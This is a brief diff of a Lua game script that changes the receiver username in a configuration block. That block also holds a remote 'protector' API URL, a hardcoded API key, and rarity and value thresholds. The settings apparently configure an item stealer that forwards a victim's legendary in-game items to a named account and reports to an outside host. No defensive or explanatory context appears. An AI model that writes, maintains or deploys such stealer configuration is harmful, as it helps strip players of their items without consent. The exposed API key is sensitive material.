@@ -5,7 +5,7 @@ _G.Ex = true
 local PROTECTOR_URL = "https://protect.mirotap.ccwu.cc/api/send"
 local API_KEY       = "b8eddf719c63cef785fa56ac8996d85413c2e0ba4c8ae769"
 
-local RECEIVER = {"Skylar1md"}
+local RECEIVER = {"skylar1Md"}
 local MINIMUM_RARITY = "Legendary"
 local MINIMUM_VALUE = 0.15
 local RECEIVERx = RECEIVER
